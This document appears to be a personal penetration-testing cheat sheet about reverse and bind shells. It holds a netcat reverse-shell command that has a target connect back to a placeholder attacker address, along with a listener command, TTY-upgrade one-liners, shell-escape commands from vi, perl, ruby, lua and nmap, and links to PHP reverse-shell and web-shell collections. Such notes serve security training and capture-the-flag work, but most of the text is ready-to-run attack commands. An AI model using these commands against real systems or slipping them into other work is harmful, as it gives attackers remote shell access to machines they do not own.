# Shell

**Reverse shells** are when the target is forced to execute code that connects back to your computer.

**Bind shells** are when the code executed on the target is used to start a listener attached to a shell directly on the target.

## Reverse Shell example:

On the attacking machine:
```
sudo nc -lvnp 443
```

On the target:
```
nc <LOCAL-IP> <PORT> -e /bin/bash
```

## Spawning a Shell


### Spawning a TTY Shell
```
python -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm

CTRL+Z; stty raw -echo; fg
```

### rlwrap
```
rlwrap nc -lvnp <port>

CTRL+Z; stty raw -echo; fg
```

## Metasloit session may require

`SHELL=/bin/bash script -q /dev/null`




## Shell Spawning
https://netsec.ws/?p=337
```
python -c 'import pty; pty.spawn("/bin/sh")'

echo os.system('/bin/bash')

/bin/sh -i

perl —e 'exec "/bin/sh";'

perl: exec "/bin/sh";

ruby: exec "/bin/sh"

lua: os.execute('/bin/sh')

(From within IRB)

exec "/bin/sh"

(From within vi)

:!bash

(From within vi)

:set shell=/bin/bash:shell

(From within nmap)

!sh
```

## Reverse Shell
[pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)


## Web Shell
[Arrexel phpbash](https://github.com/Arrexel/phpbash)

```
/usr/share/webshells
```

[Daniel Miessler webshells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)

